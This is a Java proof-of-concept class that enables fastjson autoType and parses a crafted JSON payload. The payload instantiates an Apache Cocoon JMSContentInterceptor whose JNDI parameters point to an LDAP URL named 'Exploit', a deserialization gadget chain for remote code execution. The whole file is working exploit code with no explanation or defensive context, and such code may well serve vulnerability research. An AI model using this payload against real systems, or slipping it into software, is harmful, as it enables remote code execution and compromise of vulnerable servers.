import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class CocoonSlidePoc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String fastjsonPayload = "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:1389/Exploit\"}, \"namespace\":\"\"}";
        JSON.parse(fastjsonPayload);
    }
}
